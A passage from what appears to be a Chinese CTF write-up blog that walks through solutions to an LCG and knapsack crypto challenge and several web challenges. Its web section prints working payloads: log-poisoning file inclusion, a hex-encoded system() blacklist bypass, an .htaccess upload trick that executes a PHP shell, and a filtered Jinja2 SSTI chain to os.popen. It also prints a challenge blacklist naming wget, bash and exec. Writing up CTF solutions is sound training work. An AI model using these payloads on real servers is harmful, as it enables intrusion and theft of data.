+ s1_low) + c - (state2 &lt;&lt; <span class="number">12</span>) - s2_low</span><br><span class="line">state1 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">0</span>] + (state1 &lt;&lt; <span class="number">12</span>)</span><br><span class="line">state2 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">1</span>] + (state2 &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * x * x + b * x + c - state1</span><br><span class="line">seed = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 626844643882</span></span><br></pre></td></tr></table></figure><p>代入逐4位爆破flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lcg</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.p = <span class="number">18068433704538283397</span></span><br><span class="line">        self.a = <span class="number">956366446278</span></span><br><span class="line">        self.b = <span class="number">1061992537343</span></span><br><span class="line">        self.c = <span class="number">636205571590</span></span><br><span class="line">        self.seed = <span class="number">626844643882</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">l = lcg()</span><br><span class="line">seed = l.seed</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">c = <span class="number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line">c = <span class="built_in">hex</span>(c)[<span class="number">2</span>:].rjust(<span class="number">9</span>*<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef-&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">nowc</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(nowc)</span><br><span class="line">    t=l.<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    <span class="keyword">return</span> mbruteforce(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(x).hexdigest().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)%(seed**<span class="number">3</span>)^(t%<span class="number">100</span>))[<span class="number">2</span>:].rjust(<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>) == nowc, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    flag += <span class="built_in">pow</span>(c[<span class="number">30</span>*i:<span class="number">30</span>*(i+<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Bag"><a href="#Bag" class="headerlink" title="Bag"></a>Bag</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">message = bytes_to_long(flag[<span class="number">8</span>:-<span class="number">1</span>])</span><br><span class="line">Baglenth=<span class="number">286</span></span><br><span class="line">Bag=[]</span><br><span class="line">Bag=Bag[::-<span class="number">1</span>]</span><br><span class="line">m=<span class="number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span></span><br><span class="line">w=<span class="number">274062421102700155372289583695782343443</span></span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(m,w)==<span class="number">1</span></span><br><span class="line">h=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> m.bit_length()%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m,lenth</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(m)&lt;lenth:</span><br><span class="line">        m=<span class="string">&#x27;0&#x27;</span>+m</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    pk=[]</span><br><span class="line">    sk=[]</span><br><span class="line">    sk.append(m)</span><br><span class="line">    sk.append(<span class="built_in">int</span>(gmpy2.invert(w,m)))</span><br><span class="line">    D=[]</span><br><span class="line">    binD=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        di=(w*Bag[i])%m</span><br><span class="line">        D.append(di)</span><br><span class="line">        bindi=<span class="built_in">bin</span>(di)[<span class="number">2</span>:]</span><br><span class="line">        bindi=pad(bindi,h)</span><br><span class="line">        binD.append(bindi)</span><br><span class="line">    U=[]</span><br><span class="line">    V=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        tempu=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        U.append(tempu)</span><br><span class="line">        tempv=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        V.append(tempv)</span><br><span class="line">    e=gmpy2.next_prime(<span class="built_in">sum</span>(V))+<span class="number">2</span></span><br><span class="line">    f=gmpy2.next_prime(<span class="built_in">sum</span>(U))</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    sk.append(<span class="built_in">int</span>(e))</span><br><span class="line">    sk.append(<span class="built_in">int</span>(f))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        ai=e*U[i]+f*V[i]</span><br><span class="line">        pk.append(<span class="built_in">int</span>(ai))</span><br><span class="line">    <span class="keyword">return</span> pk,sk</span><br><span class="line">Pk,Sk=keygen()</span><br><span class="line"><span class="built_in">print</span>(Pk)</span><br><span class="line"><span class="built_in">print</span>(Sk)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plain,pk</span>):</span></span><br><span class="line">    mbin=<span class="built_in">bin</span>(plain)[<span class="number">2</span>:]</span><br><span class="line">    c=<span class="number">0</span></span><br><span class="line">    mbin=pad(mbin,Baglenth)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        c=c+<span class="built_in">int</span>(mbin[i])*pk[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">c=Encrypt(message,Pk)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure></blockquote><p>背包密码系统，LLL算法解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">pubKey = []</span><br><span class="line">nbit = <span class="built_in">len</span>(pubKey)</span><br><span class="line">encoded = </span><br><span class="line">A = Matrix(ZZ, nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, nbit] = pubKey[i]</span><br><span class="line">A[nbit, nbit] = -<span class="built_in">int</span>(encoded)</span><br><span class="line"></span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>):</span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i, M)</span><br><span class="line">        M = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> M)</span><br><span class="line">        M = M[:-<span class="number">1</span>]</span><br><span class="line">        M = <span class="built_in">hex</span>(<span class="built_in">int</span>(M, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(M))</span><br><span class="line">        </span><br><span class="line"><span class="string">b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>文件包含，绕 <code>require_once</code>，burpsuite或 <code>curl -A</code> 修改User-Agent为 <code>&lt;?php show_source(&quot;flag.php&quot;);?&gt;</code>，</p><p>然后用日志包含 <code>?file=/var/log/nginx/access.log</code> 得到flag。</p><p>​    </p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><blockquote><p>Post something</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = date(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = date(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$fl4g</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>异常处理函数 <code>use()</code> 中输出flag，传参时传入数组即可触发异常：<code>ctf[]=1</code>。</p><p>​    </p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_ireplace(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>黑名单绕过rce，用16进制编码绕过：<code>aaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;);</code></p><p>​    </p><h3 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h3><p>文件上传后缀白名单绕过，利用.htaccess文件实现非PHP文件解析成PHP代码执行。</p><p>先上传 <code>.htaccess</code> 文件，由于文件中不能包含 <code>&lt;?</code> ，用PHP伪协议base64解码处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot;</span><br></pre></td></tr></table></figure><p>再上传base64编码后的 <code>shell.xxx</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7</span><br></pre></td></tr></table></figure><p>访问 <code>shell.xxx</code>，其中内容 <code>&lt;?php print_r(file_get_contents(&#39;/flag&#39;));</code> 以PHP代码执行，得到flag。</p><p>​    </p><h3 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h3><p>登录框随便输入账号密码，进入 <code>Hello xxx</code> 界面，尝试更换账号为 <code>&#123;&#123;2*3&#125;&#125;</code>，出现 <code>Hello 6</code>，可利用SSTI注入rce。</p><p>Fuzz发现过滤了很多符号，包括 <code>request _ &#39; &quot; [ . 空格 class getitem import</code> 等，不过 <code>config</code> 可用，可从 <code>&#123;&#123;config&#125;&#125;</code> 内容字符串中找到所需字符来拼接构造字符串，可以避免用到引号；过滤的关键词使用 <code>dict(cla=aa,ss=bb)|join()</code> 形式绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _</span></span><br><span class="line">config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 空格</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># /</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __class__</span></span><br><span class="line">(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># config.__class__.__init__.__globals__</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(geti=aa,tem=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)(<span class="built_in">dict</span>(o=aa,s=bb)|join())|attr(<span class="built_in">dict</span>(po=aa,pen=bb)|join())(<span class="built_in">dict</span>(c=aa,at=bb)|join()+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)+<span class="built_in">dict</span>(fl=aa,ag=bb)|join())|attr(<span class="built_in">dict</span>(re=aa,ad=bb)|join())()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span 